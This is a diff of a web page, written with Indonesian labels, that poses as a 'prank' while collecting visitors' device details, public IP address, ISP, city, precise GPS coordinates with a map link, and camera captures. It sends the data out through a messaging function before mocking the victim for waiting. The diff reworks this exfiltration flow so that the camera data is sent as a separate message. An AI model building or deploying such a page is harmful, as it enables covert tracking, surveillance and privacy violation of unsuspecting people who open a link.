@@ -23,7 +23,6 @@
       font-size: 14px;
       padding: 20px;
       max-width: 90vw;
-      animation: typing 1s steps(40, end) 1;
       border-left: 2px solid #0f0;
       padding-left: 15px;
       animation: cursor 1s step-end infinite;
@@ -114,29 +113,30 @@
       const ref = document.referrer || 'Langsung';
 
       return `
+- SCRIPT VERSION 2
 - 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 -
 
 Jenis Perangkat        : ${brand}
-User Agent          : ${ua}
-Platform            : ${platform}
-Vendor Browser      : ${vendor}
-GPU Vendor          : ${gpu.vendor}
-GPU Renderer        : ${gpu.renderer}
-CPU                 : ${navigator.hardwareConcurrency || '-'} inti
-RAM                 : ${navigator.deviceMemory || '-'} GB
-Resolusi Layar      : ${screen.width} x ${screen.height}
-Orientasi Layar     : ${screen.orientation?.type || '-'}
-Touch Support       : ${touch} (${navigator.maxTouchPoints} titik)
-Kerapatan Piksel    : ${window.devicePixelRatio}
-Cookies Aktif       : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
-JavaScript          : Aktif
-Do Not Track        : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
-HTTPS               : ${location.protocol === "https:" ? "Ya" : "Tidak"}
-Zona Waktu          : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Waktu Lokal         : ${waktu}
-Referrer            : ${ref}
-Baterai             : ${Math.round(bat.level * 100)}%
-Sedang Mengisi      : ${bat.charging ? '✅' : '🚫'}
+User Agent             : ${ua}
+Platform               : ${platform}
+Vendor Browser         : ${vendor}
+GPU Vendor             : ${gpu.vendor}
+GPU Renderer           : ${gpu.renderer}
+CPU                   : ${navigator.hardwareConcurrency || '-'} inti
+RAM                   : ${navigator.deviceMemory || '-'} GB
+Resolusi Layar        : ${screen.width} x ${screen.height}
+Orientasi Layar       : ${screen.orientation?.type || '-'}
+Touch Support         : ${touch} (${navigator.maxTouchPoints} titik)
+Kerapatan Piksel      : ${window.devicePixelRatio}
+Cookies Aktif         : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+JavaScript            : Aktif
+Do Not Track          : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
+HTTPS                 : ${location.protocol === "https:" ? "Ya" : "Tidak"}
+Zona Waktu            : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Waktu Lokal           : ${waktu}
+Referrer              : ${ref}
+Baterai               : ${Math.round(bat.level * 100)}%
+Sedang Mengisi        : ${bat.charging ? '✅' : '🚫'}
 `.trim();
     };
 
@@ -147,11 +147,11 @@ Sedang Mengisi      : ${bat.charging ? '✅' : '🚫'}
         return `
 - 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗝𝗔𝗥𝗜𝗡𝗚𝗔𝗡 〙 -
 
-IP Publik           : ${ip.ip}
-Penyedia Layanan    : ${ip.org}
-Negara              : ${ip.country_name}
-Provinsi            : ${ip.region}
-Kota                : ${ip.city}
+IP Publik             : ${ip.ip}
+Penyedia Layanan      : ${ip.org}
+Negara                : ${ip.country_name}
+Provinsi              : ${ip.region}
+Kota                  : ${ip.city}
 `.trim();
       } catch {
         return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
@@ -165,10 +165,10 @@ Kota                : ${ip.city}
           resolve(`
 - 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 -
 
-Latitude            : ${latitude}
-Longitude           : ${longitude}
-Akurasi             : ±${accuracy} meter
-Peta                : https://maps.google.com/?q=${latitude},${longitude}
+Latitude              : ${latitude}
+Longitude             : ${longitude}
+Akurasi               : ±${accuracy} meter
+Peta                  : https://maps.google.com/?q=${latitude},${longitude}
 `);
         }, () => {
           resolve(`
@@ -221,12 +221,14 @@ Peta                : https://maps.google.com/?q=${latitude},${longitude}
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
       const lokasi = await ambilLokasi();
-      const kamera = await ambilKamera();
 
-      const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
-      document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
+      const final = `${info}\n\n${ip}\n\n${lokasi}`;
       await kirimPesan(final);
 
+      const kamera = await ambilKamera();
+      if (kamera.trim()) await kirimPesan(kamera);
+
+      document.getElementById("msg").textContent = "Anda kena prank mau aja nunggu 😹.";
       setTimeout(() => {
         document.getElementById("msg").classList.add("hidden");
         const elemen = document.createElement("div");
